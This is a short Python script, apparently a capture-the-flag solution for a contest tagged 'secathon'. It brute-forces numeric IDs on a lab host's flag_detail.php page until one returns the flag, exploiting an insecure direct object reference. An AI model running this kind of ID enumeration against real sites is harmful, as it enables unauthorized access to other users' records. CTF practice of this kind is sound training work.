import requests

for i in range(100000):
	url = "http://172.16.120.3/flag_store/flag_detail.php?id=" + str(i)
	content = requests.get(url).content
	if "secathon" in content.lower():
		print url
		break